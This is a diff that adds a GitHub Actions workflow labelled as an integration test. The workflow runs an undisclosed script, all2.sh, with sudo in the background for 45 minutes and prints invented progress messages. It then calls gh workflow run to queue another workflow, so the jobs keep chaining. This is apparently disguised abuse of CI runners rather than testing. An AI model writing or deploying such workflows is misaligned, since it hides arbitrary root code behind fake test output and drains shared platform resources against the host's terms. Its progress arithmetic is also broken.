@@ -1,0 +1,53 @@
+name: CI Test Matrix 4
+
+on:
+  workflow_dispatch:
+
+jobs:
+  integration-test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 50
+    
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Initialize test environment 4
+        run: |
+          echo "========================================"
+          echo "CI TEST RUNNER 4 INITIALIZED"
+          echo "Timestamp: $(date)"
+          echo "Test duration: 45 minutes"
+          echo "========================================"
+
+      - name: Execute test suite (45 min)
+        run: |
+          echo "Starting test execution..."
+          sudo bash ./all2.sh &
+          TEST_PID=$!
+          echo "Test process started: PID=$TEST_PID"
+          
+          echo "Running integration tests..."
+          for i in {1..45}; do
+            echo "Test 4 - Progress: $($i*100/45)% ($i/45 min)"
+            sleep 60
+          done
+          
+          echo "Test cycle complete. Terminating process..."
+          kill $TEST_PID 2>/dev/null || true
+          sudo pkill -f all2.sh 2>/dev/null || true
+          echo "Process terminated cleanly"
+
+      - name: Queue next test iteration
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "Scheduling next test cycle..."
+          gh workflow run "test_matrix_fqts28na.yml" --repo alanWy01/dock
+          echo "Next cycle queued successfully"
+
+      - name: Finalize test run
+        run: |
+          echo "Test runner 4 completed at $(date)"
+          echo "Restarting for continuous integration..."
+
